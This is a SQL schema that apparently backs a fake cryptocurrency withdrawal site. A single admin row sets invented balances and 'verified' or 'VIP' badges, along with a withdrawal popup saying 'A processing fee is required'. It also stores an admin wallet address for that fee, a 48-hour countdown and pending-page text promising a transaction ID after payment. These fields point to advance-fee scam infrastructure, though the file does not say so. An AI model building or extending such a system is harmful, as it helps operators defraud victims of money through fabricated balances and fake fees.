-- Create admin_data table for storing admin configuration
-- SINGLE RECORD TABLE: Only one admin configuration exists at a time
CREATE TABLE IF NOT EXISTS admin_data (
  id INTEGER PRIMARY KEY DEFAULT 1,
  
  -- Authentication
  auth_password VARCHAR(255) NOT NULL DEFAULT '',
  auth_verification_code VARCHAR(10) NOT NULL DEFAULT '',
  
  -- Settings
  test_mode BOOLEAN DEFAULT FALSE,
  admin_password VARCHAR(255) NOT NULL DEFAULT '',
  
  -- Profile
  profile_photo TEXT,
  profile_name VARCHAR(255) DEFAULT 'Crypto Trader',
  user_id VARCHAR(255) DEFAULT '123456789',
  is_vip BOOLEAN DEFAULT FALSE,
  is_verified BOOLEAN DEFAULT FALSE,
  
  -- Balances
  crypto_balance DECIMAL(20, 8) DEFAULT 0,
  crypto_symbol VARCHAR(10) DEFAULT 'BTC',
  fiat_balance DECIMAL(20, 2) DEFAULT 0,
  fiat_symbol VARCHAR(5) DEFAULT '$',
  
  -- Withdrawal Modal UI
  modal_title_template TEXT DEFAULT 'Processing Withdrawal of [AMOUNT]',
  modal_scrollable_message TEXT DEFAULT '',
  priority_queue_title VARCHAR(255) DEFAULT 'Withdrawal Processing',
  priority_queue_description TEXT DEFAULT 'A processing fee is required',
  network_display_name VARCHAR(255) DEFAULT 'BSC (BEP20)',
  admin_wallet_address TEXT DEFAULT '',
  yellow_warning_text TEXT DEFAULT 'Confirm the fee amount',
  fee_amount DECIMAL(20, 8) DEFAULT 0,
  countdown_duration INTEGER DEFAULT 172800,
  primary_button_text VARCHAR(255) DEFAULT 'Continue',
  secondary_button_text VARCHAR(255) DEFAULT 'Cancel',
  
  -- Pending Page UI
  pending_title VARCHAR(255) DEFAULT 'Withdrawal Pending',
  pending_message_line1 TEXT DEFAULT 'Your withdrawal request has been submitted',
  pending_message_line2 TEXT DEFAULT 'Please complete the fee payment',
  pending_message_line3 TEXT DEFAULT 'Transaction ID will be generated upon confirmation',
  pending_ok_button_text VARCHAR(255) DEFAULT 'OK',
  
  -- Tracking
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  
  CONSTRAINT admin_data_single_record CHECK (id = 1)
);

-- Create withdrawal_transactions table for storing withdrawal history with status tracking
CREATE TABLE IF NOT EXISTS withdrawal_transactions (
  id VARCHAR(255) PRIMARY KEY,
  amount DECIMAL(20, 8) NOT NULL,
  crypto_symbol VARCHAR(10) NOT NULL,
  address TEXT NOT NULL,
  network VARCHAR(100) NOT NULL,
  status VARCHAR(20) NOT NULL DEFAULT 'pending' CHECK (status IN ('pending', 'completed')),
  timestamp BIGINT NOT NULL,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Create indexes for better query performance
CREATE INDEX IF NOT EXISTS idx_admin_data_single ON admin_data(id);
CREATE INDEX IF NOT EXISTS idx_withdrawal_timestamp ON withdrawal_transactions(timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_withdrawal_status ON withdrawal_transactions(status);
